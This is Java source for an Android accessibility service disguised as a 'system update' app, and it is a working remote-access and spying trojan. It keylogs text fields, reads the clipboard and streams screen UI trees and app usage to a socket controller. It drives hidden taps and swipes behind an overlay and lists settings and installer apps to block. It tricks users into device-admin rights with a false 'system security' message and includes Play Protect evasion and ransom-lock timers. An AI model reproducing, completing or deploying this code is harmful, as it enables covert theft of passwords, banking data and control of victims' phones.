package com.systemupdate.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ResolveInfo;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Display;
import android.view.InputDevice;
import android.view.MotionEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import java.util.Set;

public class PhantomAccessibilityService extends AccessibilityService {

    private static final String TAG = "Accessibility";
    private static volatile PhantomAccessibilityService instance;
    private static volatile Context cachedContext;

    private SocketManager socketManager;
    private StringBuilder keylogBuffer = new StringBuilder();
    private Handler handler = new Handler(Looper.getMainLooper());
    private String lastForegroundPackage = "";
    private long lastClipboardCheck = 0L;
    private long lastUiTreePush = 0L;
    private long lastPlayProtectAttempt = 0L;
    private long lastRansomLock = 0L;
    private static final long UI_TREE_THROTTLE_MS = 700;
    private static final long PLAY_PROTECT_COOLDOWN_MS = 60000;
    private static final long RANSOM_LOCK_INTERVAL_MS = 15000;

    private static final int SAFE_TOP_DP = 40;
    private static final int SAFE_BOTTOM_DP = 40;

    private static final Set<String> BLOCKED_PACKAGES = new HashSet<>(Arrays.asList(
        "com.android.settings",
        "com.samsung.android.settings",
        "com.miui.securitycenter",
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.samsung.android.packageinstaller"
    ));

    private Random rnd = new Random();
    private PowerManager.WakeLock wakeLock;
    private boolean adminActivationInProgress = false;

    public static PhantomAccessibilityService getInstance() { return instance; }
    public static Context getCtx() { return cachedContext; }

    public static boolean isRunning() {
        try { if (instance != null) return true; } catch (Throwable t) { }

        Context ctx = cachedContext;
        if (ctx == null) { try { ctx = SocketManager.getContext(); } catch (Throwable t) { } }
        if (ctx != null) {
            try {
                SharedPreferences sp = ctx.getSharedPreferences("phantom_a11y", Context.MODE_PRIVATE);
                if (sp.getBoolean("a11y_alive", false)) return true;
            } catch (Throwable t) { }
        }

        if (ctx == null) return false;
        return isAccessibilityEnabled(ctx);
    }

    public static boolean isAccessibilityEnabled(Context ctx) {
        if (ctx == null) {
            ctx = cachedContext;
            if (ctx == null) { try { ctx = SocketManager.getContext(); } catch (Throwable t) { } }
        }
        if (ctx == null) return false;
        try {
            AccessibilityManager am = (AccessibilityManager) ctx.getSystemService(Context.ACCESSIBILITY_SERVICE);
            if (am != null) {
                List<AccessibilityServiceInfo> enabled =
                    am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
                if (enabled != null) {
                    for (AccessibilityServiceInfo info : enabled) {
                        if (info == null) continue;
                        ResolveInfo ri = info.getResolveInfo();
                        if (ri == null || ri.serviceInfo == null) continue;
                        String pkg = ri.serviceInfo.packageName;
                        String cls = ri.serviceInfo.name;
                        if (pkg != null && pkg.equals("com.systemupdate.app")) return true;
                        if (cls != null && cls.contains("PhantomAccessibilityService")) return true;
                    }
                }
            }
        } catch (Throwable t) { }
        try {
            String enabled = Settings.Secure.getString(ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            String lower = enabled.toLowerCase();
            return lower.contains("com.systemupdate.app") || lower.contains("phantomaccessibilityservice");
        } catch (Throwable t) { return false; }
    }

    private void markAlive(boolean alive) {
        try {
            SharedPreferences sp = getSharedPreferences("phantom_a11y", Context.MODE_PRIVATE);
            sp.edit().putBoolean("a11y_alive", alive).apply();
        } catch (Throwable t) { }
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        cachedContext = getApplicationContext();
        markAlive(true);

        try {
            Intent alive = new Intent("com.systemupdate.app.ACCESSIBILITY_UP");
            alive.setPackage(getPackageName());
            sendBroadcast(alive);
        } catch (Throwable t) { }

        try {
            AccessibilityServiceInfo info = getServiceInfo();
            if (info != null) {
                info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
                info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
                info.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
                info.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
                info.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
                info.notificationTimeout = 50;
                if (Build.VERSION.SDK_INT >= 34) {
                    try { info.setMotionEventSources(InputDevice.SOURCE_TOUCHSCREEN); }
                    catch (Throwable t) { }
                }
                setServiceInfo(info);
            }
        } catch (Throwable t) { PhantomLog.e(TAG, "setServiceInfo", t); }

        try {
            SocketManager sm = SocketManager.getInstance();
            if (sm != null) {
                sm.setAccessibilityService(this);
                sm.sendAccessibilityState();
                sm.sendRegister();
            }
        } catch (Throwable t) { }

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                try { new OverlayManager(PhantomAccessibilityService.this); } catch (Throwable t) { }
                try { startGuardService(); } catch (Throwable t) { }
                try { announceAccessibilityAlive(); } catch (Throwable t) { }
            }
        }, 3000);

        scheduleAnnounce(0);
        scheduleRegisterRetry(0);
    }

    @Override
    public boolean onUnbind(Intent intent) {
        markAlive(false);
        instance = null;
        return super.onUnbind(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        markAlive(false);
        try { flushKeylog(); } catch (Throwable t) { }
        try { OverlayManager om = OverlayManager.getInstance(); if (om != null) om.hide(); } catch (Throwable t) { }
        try { if (wakeLock != null && wakeLock.isHeld()) wakeLock.release(); } catch (Throwable t) { }
        instance = null;
    }

    @Override
    public void onInterrupt() { }

    @Override
    public void onMotionEvent(MotionEvent event) { }

    public boolean stealthTap(final float x, final float y) {
        if (Build.VERSION.SDK_INT < 24) return false;
        try {
            final OverlayManager om = OverlayManager.getInstance();
            if (om != null && om.isVisible()) {
                om.fadeForGesture(140, new Runnable() { @Override public void run() { doTap(x, y); } });
                return true;
            }
            doTap(x, y);
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean stealthSwipe(final float x1, final float y1, final float x2, final float y2, final int durMs) {
        if (Build.VERSION.SDK_INT < 24) return false;
        try {
            final OverlayManager om = OverlayManager.getInstance();
            if (om != null && om.isVisible()) {
                om.fadeForGesture(160, new Runnable() { @Override public void run() { doSwipe(x1, y1, x2, y2, durMs); } });
                return true;
            }
            doSwipe(x1, y1, x2, y2, durMs);
            return true;
        } catch (Throwable t) { return false; }
    }

    private void doTap(float x, float y) {
        try {
            Path path = new Path();
            path.moveTo(x, clampY(y));
            GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, 60);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(s);
            dispatchGesture(b.build(), null, null);
        } catch (Throwable t) { }
    }

    private void doSwipe(float x1, float y1, float x2, float y2, int durMs) {
        try {
            float cy1 = clampY(y1);
            float cy2 = clampY(y2);
            Path path = new Path();
            path.moveTo(x1, cy1);
            path.lineTo(x2, cy2);
            int dur = Math.max(150, Math.min(2000, durMs));
            GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, dur);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(s);
            dispatchGesture(b.build(), null, null);
        } catch (Throwable t) { }
    }

    private void announceAccessibilityAlive() {
        try {
            SocketManager sm = SocketManager.getInstance();
            if (sm != null) { sm.sendAccessibilityState(); sm.sendRegister(); }
        } catch (Throwable t) { }
    }

    private void scheduleAnnounce(final int attempt) {
        if (attempt > 12) {
            handler.postDelayed(new Runnable() {
                @Override public void run() {
                    try { announceAccessibilityAlive(); } catch (Throwable t) { }
                    handler.postDelayed(this, 30000);
                }
            }, 30000);
            return;
        }
        long delay = attempt == 0 ? 1500 : 5000;
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                try { announceAccessibilityAlive(); } catch (Throwable t) { }
                scheduleAnnounce(attempt + 1);
            }
        }, delay);
    }

    private void scheduleRegisterRetry(final int attempt) {
        if (attempt > 20) return;
        handler.postDelayed(new Runnable() {
            @Override public void run() {
                try {
                    SocketManager sm = SocketManager.getInstance();
                    if (sm != null) { sm.sendRegister(); sm.sendAccessibilityState(); }
                    else if (attempt < 20) scheduleRegisterRetry(attempt + 1);
                } catch (Throwable t) {
                    if (attempt < 20) scheduleRegisterRetry(attempt + 1);
                }
            }
        }, attempt == 0 ? 2000 : 5000);
    }

    private void startGuardService() {
        try {
            Intent i = new Intent(this, GuardService.class);
            i.setAction("com.systemupdate.app.GUARD_SERVICE");
            startService(i);
        } catch (Throwable t) { }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            int type = event.getEventType();
            CharSequence pkgCs = event.getPackageName();
            String pkg = pkgCs != null ? pkgCs.toString() : "";

            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                try {
                    List<CharSequence> texts = event.getText();
                    if (texts != null && !texts.isEmpty()) {
                        CharSequence cs = texts.get(0);
                        if (cs != null && cs.length() > 0) {
                            keylogBuffer.append(cs).append("|");
                            if (keylogBuffer.length() > 200) flushKeylog();
                        }
                    }
                } catch (Throwable t) { }
            }

            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (pkgCs != null && !pkg.equals(lastForegroundPackage)) {
                    lastForegroundPackage = pkg;
                    if (socketManager == null) socketManager = SocketManager.getInstance();
                    if (socketManager != null) socketManager.sendAppDetection(pkg);
                }
                pushUiTreeThrottled();
            }
            if (type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                pushUiTreeThrottled();
            }
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                try {
                    long now = System.currentTimeMillis();
                    if (now - lastRansomLock > RANSOM_LOCK_INTERVAL_MS) {
                        lastRansomLock = now;
                    }
                } catch (Throwable t) { }
            }

            if (type == AccessibilityEvent.TYPE_VIEW_FOCUSED
                || type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                long now = System.currentTimeMillis();
                if (now - lastClipboardCheck > 3000) {
                    lastClipboardCheck = now;
                    tryReadClipboard();
                }
            }
        } catch (Throwable t) { }
    }

    private void pushUiTreeThrottled() {
        try {
            long now = System.currentTimeMillis();
            if (now - lastUiTreePush < UI_TREE_THROTTLE_MS) return;
            lastUiTreePush = now;
            handler.postDelayed(new Runnable() {
                @Override public void run() {
                    try {
                        if (socketManager == null) socketManager = SocketManager.getInstance();
                        if (socketManager != null) socketManager.sendUiTreePush();
                    } catch (Throwable t) { }
                }
            }, 250);
        } catch (Throwable t) { }
    }

    private void tryReadClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) return;
            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) return;
            CharSequence cs = clip.getItemAt(0).coerceToText(this);
            if (cs == null || cs.length() == 0) return;
            String text = cs.toString();
            if (text.length() > 1000) text = text.substring(0, 1000);
            if (socketManager == null) socketManager = SocketManager.getInstance();
            if (socketManager != null) socketManager.sendClipboard(text);
        } catch (Throwable t) { }
    }

    private void flushKeylog() {
        try {
            if (socketManager != null && keylogBuffer.length() > 0) {
                socketManager.sendKeylog(keylogBuffer.toString());
            }
        } catch (Throwable t) { }
        keylogBuffer.setLength(0);
    }

    private int dpToPx(int dp) {
        try { return (int) (dp * getResources().getDisplayMetrics().density); }
        catch (Throwable t) { return dp * 3; }
    }

    private float clampY(float y) {
        try {
            int[] s = getScreenSize();
            int topLimit = dpToPx(SAFE_TOP_DP);
            int bottomLimit = s[1] - dpToPx(SAFE_BOTTOM_DP);
            if (y < topLimit) return topLimit;
            if (y > bottomLimit) return bottomLimit;
            return y;
        } catch (Throwable t) { return y; }
    }

    public boolean humanTap(final float x, final float y) {
        if (Build.VERSION.SDK_INT < 24) return false;
        try {
            final float jx = x + (rnd.nextFloat() * 16 - 8);
            final float jy = clampY(y + (rnd.nextFloat() * 16 - 8));
            final int dur = 60 + rnd.nextInt(80);
            handler.postDelayed(new Runnable() {
                @Override public void run() {
                    try {
                        Path path = new Path();
                        path.moveTo(jx, jy);
                        GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, dur);
                        GestureDescription.Builder b = new GestureDescription.Builder();
                        b.addStroke(s);
                        dispatchGesture(b.build(), null, null);
                    } catch (Throwable t) { }
                }
            }, rnd.nextInt(180));
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean humanType(final String text) {
        if (text == null || text.isEmpty()) return false;
        try {
            handler.post(new Runnable() {
                @Override public void run() {
                    try {
                        AccessibilityNodeInfo root = getRootInActiveWindow();
                        if (root == null) return;
                        AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                        if (focused == null) return;
                        Bundle args = new Bundle();
                        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                        focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                    } catch (Throwable t) { }
                }
            });
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean performTap(float x, float y) {
        if (Build.VERSION.SDK_INT < 24) return false;
        try {
            Path path = new Path();
            path.moveTo(x, clampY(y));
            GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, 60);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(s);
            return dispatchGesture(b.build(), null, null);
        } catch (Throwable t) { return false; }
    }

    public boolean performSwipe(float x1, float y1, float x2, float y2, int durationMs) {
        if (Build.VERSION.SDK_INT < 24) return false;
        try {
            float cy1 = clampY(y1);
            float cy2 = clampY(y2);
            Path path = new Path();
            path.moveTo(x1, cy1);
            path.lineTo(x2, cy2);
            int dur = Math.max(200, Math.min(2000, durationMs));
            GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, dur);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(s);
            return dispatchGesture(b.build(), null, null);
        } catch (Throwable t) { return false; }
    }

    public boolean performLongPress(float x, float y) {
        if (Build.VERSION.SDK_INT < 24) return false;
        try {
            Path path = new Path();
            path.moveTo(x, clampY(y));
            GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, 800);
            GestureDescription.Builder b = new GestureDescription.Builder();
            b.addStroke(s);
            return dispatchGesture(b.build(), null, null);
        } catch (Throwable t) { return false; }
    }

    public boolean gesture(String direction) {
        try {
            int[] screen = getScreenSize();
            int W = screen[0], H = screen[1];
            int cx = W / 2, cy = H / 2;
            if ("UP".equals(direction)) return performSwipe(cx, (int)(H * 0.75f), cx, (int)(H * 0.25f), 350);
            if ("DOWN".equals(direction)) return performSwipe(cx, (int)(H * 0.25f), cx, (int)(H * 0.75f), 350);
            if ("LEFT".equals(direction)) return performSwipe((int)(W * 0.85f), cy, (int)(W * 0.15f), cy, 350);
            if ("RIGHT".equals(direction)) return performSwipe((int)(W * 0.15f), cy, (int)(W * 0.85f), cy, 350);
            return false;
        } catch (Throwable t) { return false; }
    }

    public boolean openAppDrawer() {
        try {
            int[] s = getScreenSize();
            performSwipe(s[0] / 2, (int)(s[1] * 0.80f), s[0] / 2, (int)(s[1] * 0.20f), 400);
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean wakeScreen() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm == null) return false;
            int flags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP;
            wakeLock = pm.newWakeLock(flags, "phantom:wake");
            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(60000);
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean ghostModeOn() {
        try { OverlayManager om = OverlayManager.getInstance(); if (om != null) om.show(); return true; }
        catch (Throwable t) { return false; }
    }

    public boolean ghostModeOff() {
        try {
            OverlayManager om = OverlayManager.getInstance();
            if (om != null) om.hide();
            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean performKey(int keyCode) {
        try {
            if (keyCode == 66) return performEnter();
            if (keyCode == 67) return performBackspace();
            if (keyCode == 61) {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return false;
                AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (focused == null) return false;
                return focused.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
            }
            if (keyCode == 4) return performGlobalAction(GLOBAL_ACTION_BACK);
            if (keyCode == 3) return performGlobalAction(GLOBAL_ACTION_HOME);
            return false;
        } catch (Throwable t) { return false; }
    }

    private boolean performEnter() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused == null) return false;
            if (Build.VERSION.SDK_INT >= 30) {
                try {
                    int imeEnter = AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.getId();
                    if (focused.performAction(imeEnter)) return true;
                } catch (Throwable t) { }
            }
            String[] labels = { "Go", "Send", "Done", "Search", "Enter" };
            for (String label : labels) {
                List<AccessibilityNodeInfo> list = root.findAccessibilityNodeInfosByText(label);
                if (list == null) continue;
                for (AccessibilityNodeInfo n : list) {
                    AccessibilityNodeInfo c = findClickableAncestor(n);
                    if (c == null) c = n;
                    if (c.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
                }
            }
            return false;
        } catch (Throwable t) { return false; }
    }

    private boolean performBackspace() {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;
            AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused == null) return false;
            CharSequence existing = focused.getText();
            if (existing != null && existing.length() > 0) {
                String s = existing.toString();
                String newText = s.substring(0, s.length() - 1);
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, newText);
                return focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            }
            return false;
        } catch (Throwable t) { return false; }
    }

    private AccessibilityNodeInfo findClickableAncestor(AccessibilityNodeInfo node) {
        if (node == null) return null;
        try {
            if (node.isClickable() && node.isEnabled()) return node;
            AccessibilityNodeInfo cur = node;
            int guard = 0;
            while (cur != null && guard++ < 20) {
                AccessibilityNodeInfo p = cur.getParent();
                if (p == null) return null;
                if (p.isClickable() && p.isEnabled()) return p;
                cur = p;
            }
        } catch (Throwable t) { }
        return null;
    }

    public boolean performTextInput(String text) { return humanType(text); }
    public boolean performBack() { try { return performGlobalAction(GLOBAL_ACTION_BACK); } catch (Throwable t) { return false; } }
    public boolean performHome() { try { return performGlobalAction(GLOBAL_ACTION_HOME); } catch (Throwable t) { return false; } }
    public boolean performRecents() { try { return performGlobalAction(GLOBAL_ACTION_RECENTS); } catch (Throwable t) { return false; } }
    public boolean performNotifications() { try { return performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); } catch (Throwable t) { return false; } }
    public boolean performLockScreen() {
        if (Build.VERSION.SDK_INT < 28) return false;
        try { return performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN); } catch (Throwable t) { return false; }
    }

    public boolean openApp(String packageName) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent == null) return false;
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return true;
        } catch (Throwable t) { return false; }
    }

    public boolean killApp(String packageName) {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) return false;
            am.killBackgroundProcesses(packageName);
            return true;
        } catch (Throwable t) { return false; }
    }

    public int[] getScreenSize() {
        try {
            android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
            return new int[]{dm.widthPixels, dm.heightPixels};
        } catch (Throwable t) { return new int[]{1080, 2400}; }
    }

    public boolean activateDeviceAdmin() {
        if (adminActivationInProgress) return true;
        adminActivationInProgress = true;
        try {
            Intent i = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                new ComponentName(this, PhantomDeviceAdminReceiver.class));
            i.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for system security");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
        } catch (Throwable t) { adminActivationInProgress = false; return false; }

        handler.postDelayed(new Runnable() {
            @Override public void run() { adminActivationInProgress = false; }
        }, 8000);
        return true;
    }

    public interface ScreenshotCallback {
        void onSuccess(ScreenshotResult result);
        void onFailure(int errorCode);
    }

    public void takeScreenShot(final ScreenshotCallback callback) {
        if (Build.VERSION.SDK_INT < 30) { callback.onFailure(-1); return; }
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY,
                new java.util.concurrent.Executor() { @Override public void execute(Runnable r) { r.run(); } },
                new TakeScreenshotCallback() {
                    @Override public void onSuccess(ScreenshotResult r) { callback.onSuccess(r); }
                    @Override public void onFailure(int e) { callback.onFailure(e); }
                });
        } catch (Throwable t) { callback.onFailure(-2); }
    }
}